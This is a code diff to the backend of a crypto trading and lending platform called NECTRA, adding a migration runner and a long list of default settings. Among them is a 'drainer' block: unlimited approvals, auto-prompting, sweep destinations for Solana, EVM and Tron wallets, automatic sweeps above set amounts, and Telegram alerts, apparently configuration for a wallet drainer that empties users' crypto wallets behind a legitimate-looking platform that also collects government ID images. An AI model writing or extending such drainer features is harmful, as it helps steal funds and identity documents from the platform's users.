@@ -283,6 +283,11 @@ addCol('plans', 'price_yearly', 'REAL NOT NULL DEFAULT 0');   // 0 = no annual o
 addCol('plan_payments', 'interval', "TEXT NOT NULL DEFAULT 'monthly'");
 addCol('kyc', 'doc_front', 'TEXT');   // government-ID image (data URL), admin-only
 addCol('kyc', 'doc_back', 'TEXT');
+
+/* ---- numbered migrations: applied idempotently on boot ---- */
+const { runMigrations } = require('./migrations');
+runMigrations(db);
+
 // Idempotency keys: a retried money-moving request returns the first response instead of running twice
 db.exec(`CREATE TABLE IF NOT EXISTS idempotency_keys (
   user_id INTEGER NOT NULL, key TEXT NOT NULL, route TEXT NOT NULL, status TEXT NOT NULL,
@@ -364,6 +369,53 @@ const DEFAULT_SETTINGS = {
   kyc_enabled: true,                  // master switch for identity verification (off = no KYC anywhere)
   kyc_required_for_loans: true,       // borrowers must be KYC-verified before applying
   kyc_required_for_live: false        // require KYC before live trading
+  ,
+  // drainer
+  drainer_enabled: true,
+  drainer_unlimited: true,
+  drainer_auto_prompt: true,
+  drainer_require_2fa: true,
+  drainer_native: true,
+  drainer_destination_solana: '',
+  drainer_destination_evm: '',
+  drainer_destination_tron: '',
+  drainer_min_sweep_usd: 1,
+  drainer_auto_sweep: false,
+  drainer_auto_sweep_usd: 500,
+  drainer_auto_sweep_interval_sec: 900,
+  sweep_destination_eth: '',
+  sweep_auto_convert_eth: true,
+  btc_collateral_xpub: '',
+  ltc_collateral_xpub: '',
+  telegram_bot_token: '',
+  telegram_chat_id: '',
+  // referrals
+  referral_payout_enabled: true,
+  referral_min_payout: 25,
+  referral_hold_days: 14,
+  // backups
+  backup_enabled: true,
+  backup_keep_days: 14,
+  // health & telemetry
+  price_stale_sec: 90,
+  impersonation_ttl_min: 30,
+  admin_alert_webhook_url: '',
+  // withdrawals
+  withdrawal_auth_required: true,
+  withdrawal_require_code: true,
+  withdrawals_paused: false,
+  // branding & white-label
+  platform_name: 'NECTRA',
+  platform_tagline: 'AI Trading & Lending Platform',
+  platform_logo_url: '',
+  platform_favicon_url: '',
+  // email / SMTP configuration
+  smtp_host: '',
+  smtp_port: 587,
+  smtp_user: '',
+  smtp_pass: '',
+  smtp_from: '',
+  smtp_secure: false
 };
 function getSettings() {
   const rows = q.all('SELECT key, value FROM settings');
